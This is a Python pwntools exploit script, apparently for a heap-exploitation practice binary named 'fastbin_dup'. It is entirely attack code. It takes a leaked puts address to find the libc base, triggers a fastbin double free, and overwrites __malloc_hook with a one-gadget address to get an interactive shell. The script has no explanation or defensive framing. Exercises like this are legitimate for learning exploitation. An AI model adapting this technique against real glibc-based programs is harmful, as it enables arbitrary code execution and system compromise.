from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./fastbin_dup', checksec=False)

libc = elf.libc

gs = """
b *main
b *main+319
b *main+492
b *main+598
"""

index = 0

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
    
def send_name(name):
    io.sendafter(b'Enter your username: ', name)

def malloc(size, data):
    global index
    io.send(b'1')
    io.sendafter(b'size: ', f'{size}'.encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')
    index += 1
    return index -1
    
def free(id):
    io.send(b'2')
    io.sendafter(b'index: ', f'{id}'.encode())
    io.recvuntil(b'> ')
    
io = start()
io.timeout = 0.1
io.recvuntil(b'puts() @ ')
puts_leak = int(io.recvline(), 16)
info("puts in libc: " + hex(puts_leak))

libc.address = puts_leak - libc.sym['puts']
info("libc: " + hex(libc.address))
send_name(b'Broder')

chunk_A = malloc(0x68, b'a'*0x68)
chunk_B = malloc(0x68, b'b'*0x68)

free(chunk_A)
free(chunk_B)
free(chunk_A)

dup = malloc(0x68, p64(libc.sym['__malloc_hook'] - 35))
malloc(0x68, b'c'*0x68)
malloc(0x68, b'd'*0x68)

malloc(0x68, b'a'*19 + p64(libc.address + 0xe1fa1))


io.interactive()
